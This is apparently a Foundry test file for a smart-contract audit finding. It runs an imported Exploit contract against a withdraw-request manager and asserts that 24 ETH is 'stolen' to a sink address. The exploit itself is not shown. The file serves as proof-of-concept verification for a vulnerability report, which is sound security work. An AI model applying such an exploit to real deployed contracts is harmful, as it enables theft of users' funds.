// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit} from "./62484-h-3-dinerowithdrawrequestmanager-vulnerable-to-token-overwit.sol";

contract Finding62484Test is Test {
    function test_first_finalizer_takes_the_overlapped_batch() public {
        Exploit e = new Exploit();
        vm.deal(address(this), 80 ether);
        e.run{value: 80 ether}();
        assertEq(e.weth().balanceOf(e.SINK()), 24 ether, "24 ETH stolen");
        assertEq(e.weth().balanceOf(address(e.victim())), 16 ether, "victim left with 16");
        assertEq(e.weth().balanceOf(address(e)), 40 ether, "attacker keeps the fair 40");
    }
}
